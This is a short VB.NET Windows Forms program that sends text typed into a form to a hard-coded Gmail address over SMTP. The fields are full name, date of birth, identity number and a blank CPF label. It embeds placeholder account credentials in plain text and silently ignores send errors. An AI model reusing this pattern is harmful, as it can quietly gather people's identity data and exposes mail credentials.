'NOTA: A Menssagem é enviada pelo proprio email cadastrado no Code'
Imports System.Net.Mail
Imports System.Windows.Forms.VisualStyles.VisualStyleElement

Public Class Form1
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        ProgressBar1.Value = ProgressBar1.Value + 1
        If ProgressBar1.Value = ProgressBar1.Maximum Then
            ProgressBar1.Value = 0
            Timer1.Stop()
            Timer1.Enabled = False
            TextBox1.Enabled = True
            TextBox2.Enabled = True
            TextBox3.Enabled = True
            TextBox4.Enabled = True
        End If
    End Sub
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim MyMailMessage As New MailMessage()
        Dim SMTPServer As New SmtpClient("smtp.gmail.com")
        'Email 
        MyMailMessage.From = New MailAddress("SeuEmail@gmail.com")
        'Destinataire 
        MyMailMessage.To.Add("SeuEmail@gmail.com")
        'Exp diteur 
        MyMailMessage.Subject = ("Assunto da Menssagem Enviada")
        'Sujet 
        MyMailMessage.Body = ("Assunto:   " & TextBox1.Text & "Nome Completo:   " & TextBox2.Text & " Data de Nascimento:   " & TextBox3.Text & "Identidade:" & TextBox4.Text & "CPF:")
        'Corps 
        'SMTP 
        SMTPServer.Port = ("587")
        SMTPServer.Credentials = New System.Net.NetworkCredential("SeuEmail@gmail.com", "Sua Senha")
        'Email (+Pass) 
        SMTPServer.EnableSsl = True
        Try
            SMTPServer.Send(MyMailMessage)
        Catch ex As Exception

        End Try

        'Envoi 
        Timer1.Enabled = True
        Timer1.Start()
        Timer1.Interval = 200
        ' = 1min 
        TextBox1.Enabled = False
        TextBox2.Enabled = False
        TextBox3.Enabled = False
        TextBox4.Enabled = False

    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class
